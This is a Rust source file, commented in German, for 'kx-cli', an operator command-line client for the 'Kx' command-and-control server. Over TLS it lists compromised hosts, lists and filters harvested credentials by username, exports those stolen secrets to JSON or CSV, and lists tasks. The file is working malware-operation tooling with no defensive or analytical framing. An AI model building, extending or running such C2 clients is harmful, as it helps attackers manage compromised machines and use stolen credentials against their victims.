//! Kx-CLI: Operator-Oberfläche für den Kx-C2-Server.
//!
//! Ermöglicht das Auflisten von Hosts und Secrets sowie den Export von
//! erbeuteten Credentials. Kommuniziert über TLS mit dem C2-Backend.

mod client;

use std::path::PathBuf;

use clap::{Parser, Subcommand};
use tracing::{error, info};

#[derive(Parser)]
#[command(name = "kx-cli", about = "Kx-Operator-Oberfläche")]
struct Cli {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: String,
    /// Pfad zum Server-Zertifikat (PEM).
    #[arg(long)]
    cert: String,

    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Alle registrierten Hosts auflisten.
    Hosts,
    /// Alle erbeuteten Secrets auflisten.
    Secrets {
        /// Optionaler Filter nach Benutzername (Teilstring).
        #[arg(long)]
        user: Option<String>,
    },
    /// Secrets in eine Datei exportieren (JSON oder CSV).
    Export {
        /// Zielpfad für den Export.
        path: PathBuf,
        /// Format: json oder csv.
        #[arg(long, default_value = "json")]
        format: String,
    },
    /// Alle Tasks auflisten.
    Tasks,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    let cli = Cli::parse();
    let c = match client::Client::new(&cli.server, &cli.token, &cli.cert) {
        Ok(c) => c,
        Err(e) => {
            error!("Client-Init fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    match &cli.command {
        Command::Hosts => match c.hosts().await {
            Ok(hosts) => {
                info!("{} Hosts gefunden", hosts.len());
                for h in &hosts {
                    println!("{:<15} {:<20} {:<15} {}", h.ip, h.hostname, h.os, h.status);
                }
            }
            Err(e) => {
                error!("Host-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Secrets { user } => match c.secrets().await {
            Ok(secrets) => {
                let filtered: Vec<_> = secrets
                    .iter()
                    .filter(|s| user.as_deref().map_or(true, |u| s.username.contains(u)))
                    .collect();
                info!("{} Secrets gefunden", filtered.len());
                for s in &filtered {
                    println!(
                        "{:<20} {:<30} {:<15} {}",
                        s.cred_type, s.username, s.source, s.collected_at
                    );
                }
            }
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Export { path, format } => match c.secrets().await {
            Ok(secrets) => match client::export(&secrets, path, format) {
                Ok(()) => info!(
                    "{} Secrets nach {} exportiert",
                    secrets.len(),
                    path.display()
                ),
                Err(e) => {
                    error!("Export fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            },
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Tasks => match c.tasks().await {
            Ok(tasks) => {
                info!("{} Tasks gefunden", tasks.len());
                for t in &tasks {
                    println!("{:<36} {:<20} {}", t.id, t.status, t.created_at);
                }
            }
            Err(e) => {
                error!("Task-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
    }
}
